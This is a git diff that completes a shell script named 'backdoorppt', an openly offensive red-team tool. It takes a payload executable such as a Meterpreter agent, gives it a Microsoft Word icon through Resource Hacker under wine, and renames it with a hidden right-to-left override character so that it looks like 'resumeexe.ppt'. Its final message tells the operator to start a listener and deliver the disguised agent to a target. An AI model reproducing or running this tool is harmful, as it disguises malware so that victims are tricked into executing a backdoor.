@@ -1,4 +1,10 @@
 #!/bin/sh
+###
+# backdoorppt - a binary transformation tool
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.1
+# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
+# codename: strange things happen under windows
+###
 
 
 
@@ -19,7 +25,20 @@ Reset="${Escape}[0m";
 
 
 
-# banner
+
+# ---------------------
+# variable declarations
+# ---------------------
+IPATH=`pwd`
+H0ME=`echo ~`
+VeR="1.1"
+
+
+
+
+# -------------
+# Tool banner
+# ------------
 cat << !
 
     +-+-+-+-+-+-+-+-+-+-+-+
@@ -78,25 +97,72 @@ fi
 
 
 
-read OP
 # ------------------------
 # start of script funtions
 # ------------------------
-clear
-echo ""
-echo ${BlueF}[☆]${white} Please 'select' [${GreenF}windows 7${white}] OS${Reset};
-# winecfg > /dev/null 2>&1
+rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# questions to user
+UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed\nexample:meterpreter.exe") > /dev/null 2>&1
+
+  # wine configurtions (winecfg)
+  echo ${BlueF}[☆]${white} Select ${GreenF}windows 7${white} from winecfg ${Reset};
+  sleep 2
+  winecfg > /dev/null 2>&1
+  sleep 1
+
+    # check for resource hacker installation (wine)
+    if [ -f "$H0ME/.wine/drive_c/Program Files/Resource Hacker/ResourceHacker.exe" ]; then
+      echo ${BlueF}[☆]${white} ResourceHacker.exe '->' ${GreenF}found! ${Reset};
+      sleep 1
+      echo ${BlueF}[☆]${white} Aborting backend appl installation... ${Reset};
+      sleep 1
+    else
+      echo ${RedF}[☠]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
+      sleep 1
+      echo ${BlueF}[☆]${white} Installing ResourceHacker under .wine directory ${Reset};
+      xterm -T "BackdoorPPt" -geometry 90x26 -e "wine $IPATH/reshacker_setup.exe && sleep 3"
+    fi
+
+      # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
+      echo ${BlueF}[☆]${white} Please wait, Transforming backdoor agent... ${Reset};
+      wine $H0ME/.wine/drive_c/"Program Files"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/backdoor.exe -action addskip -res $IPATH/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
+      echo ${BlueF}[☆]${white} ResourceHacker, change backdoor agent icon... ${Reset};
+      sleep 1
+
+    # insert .ppt hidden extension
+    echo ${BlueF}[☆]${white} Adding hidden extension to agent... ${Reset};
+    mv $IPATH/backdoor.exe  $IPATH/backdoor_ppt.exe > /dev/null 2>&1
+    sleep 1
+
+  cd $IPATH
+  # rename backdoor name
+  echo ${BlueF}[☆]${white} Word doc builder '->' ${GreenF}done... ${Reset};
+  ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
+  sleep 1
+
+# final output to user
+cat << !
+
+    Final file  : $IPATH/resumeexe.ppt
+    Credits     : Damon Mohammadbagher
+    Tool Author : r00t-3xp10it (SSA redTeam)
+
+    Your backdoor agent its now transformed into one fake
+    word doc (ppt) remmenber that .exe extensions will not
+    be 'visible' under windows systems, because the system
+    default behavior its: NOT show hidden extensions...
+
+    We are now ready to start a handler (listenner) and
+    deliver the transformed agent to the target machine.
+
+!
 
 
-# wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
-# wine /root/.wine/drive_c/"Program Files"/"Resource Hacker"/ResourceHacker.exe -open /root/putty.exe -save /root/backdoor.exe -action addskip -res /root/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
+else
+  echo ${RedF}[x]${white} Abort all tasks${RedF}!${Reset};
+  sleep 2
+fi
 
-# insert .ppt hidden extension
-# mv backdoor.exe  backdoor_ppt.exe
-
-# rename backdoor name
-# ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
-
-
-
-
+exit
